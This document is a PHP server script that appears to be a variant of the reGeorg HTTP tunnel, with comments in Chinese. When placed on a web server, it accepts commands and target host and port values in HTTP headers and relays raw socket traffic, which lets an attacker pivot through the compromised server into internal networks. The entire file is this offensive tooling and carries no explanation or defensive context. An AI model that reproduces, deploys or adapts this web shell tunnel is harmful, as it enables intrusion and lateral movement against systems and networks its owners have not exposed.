<?php
    if ($_SERVER['REQUEST_METHOD'] === "GET"){
        exit("Georg says, 'All seems fine'");
    };

    if ($_SERVER['REQUEST_METHOD'] === "POST"){
        set_time_limit(0);
        # 获取请求头
        $headers = apache_request_headers();
        $cmd = $headers["X-Cmd"];
        switch($cmd){
            case "CONNECT":{
                $target = $headers["X-Target"];
                # $port = (int)$headers["X-Port"];
                $port = $headers["X-Port"];
                $res = fsockopen($target, $port);
                # 访问出错
                if ($res === false){
                    header('X-STATUS: FAIL');
                    header('X-ERROR: Failed connecting to target');
                    return;
                }
                # 正常访问
                # 设置为非阻塞模式
                stream_set_blocking($res, false);
                # 创建会话
                @session_start();
                $_SESSION["run"] = true;
                $_SESSION["writebuf"] = "";
                $_SESSION["readbuf"] = "";
                # 清除缓冲区
                ob_end_clean();
                header('X-STATUS: OK');
                header("Connection: close");
                ignore_user_abort();
                ob_start();
                $size = ob_get_length();
                header("Content-Length: $size");
                ob_end_flush();
                flush();
                session_write_close();

                while ($_SESSION["run"]){
                    $readBuff = "";
                    @session_start();
                    $writeBuff = $_SESSION["writebuf"];
                    echo var_dump($writeBuff);
                    $_SESSION["writebuf"] = "";
                    session_write_close();
                    if ($writeBuff != ""){
                        stream_set_blocking($res, false);
                        $i = fwrite($res, $writeBuff); #socket_write($sock, $writeBuff, strlen($writeBuff));
                        if($i === false){
                            @session_start();
                            $_SESSION["run"] = false;
                            session_write_close();
                            header('X-STATUS: FAIL');
                            header('X-ERROR: Failed writing socket');
                        }
                    }
                    stream_set_blocking($res, false);
                    while ($o = fgets($res, 10)) {
                        if($o === false){
                            @session_start();
                            $_SESSION["run"] = false;
                            session_write_close();
                            header('X-STATUS: FAIL');
                            header('X-ERROR: Failed reading from socket');
                        }
                        $readBuff .= $o;
                    }
                    if ($readBuff!=""){
                        @session_start();
                        $_SESSION["readbuf"] .= $readBuff;
                        session_write_close();
                    }
                    fclose($res);
                }
            };
            break;
            case "READ":{
                @session_start();
				$readBuffer = $_SESSION["readbuf"];
                $_SESSION["readbuf"]="";
                $running = $_SESSION["run"];
				session_write_close();
                if ($running) {
					header('X-STATUS: OK');
                    header("Connection: Keep-Alive");
					echo $readBuffer;
					return;
				} else {
                    header('X-STATUS: FAIL');
                    header('X-ERROR: RemoteSocket read filed');
					return;
				}
            }
            break;
            case "DISCONNECT":{
                error_log("DISCONNECT recieved");
				@session_start();
				$_SESSION["run"] = false;
				session_write_close();
				return;
			}
			break;
			case "FORWARD":{
                @session_start();
                $running = $_SESSION["run"];
				session_write_close();
                if(!$running){
                    header('X-STATUS: FAIL');
					header('X-ERROR: No more running, close now');
                    return;
                }
                header('Content-Type: application/octet-stream');
				$rawPostData = file_get_contents("php://input");
				if ($rawPostData) {
					@session_start();
					$_SESSION["writebuf"] .= $rawPostData;
					session_write_close();
					header('X-STATUS: OK');
                    header("Connection: Keep-Alive");
					return;
				} else {
					header('X-STATUS: FAIL');
					header('X-ERROR: POST request read filed');
				}
			}
			break;
        };
    };
?>
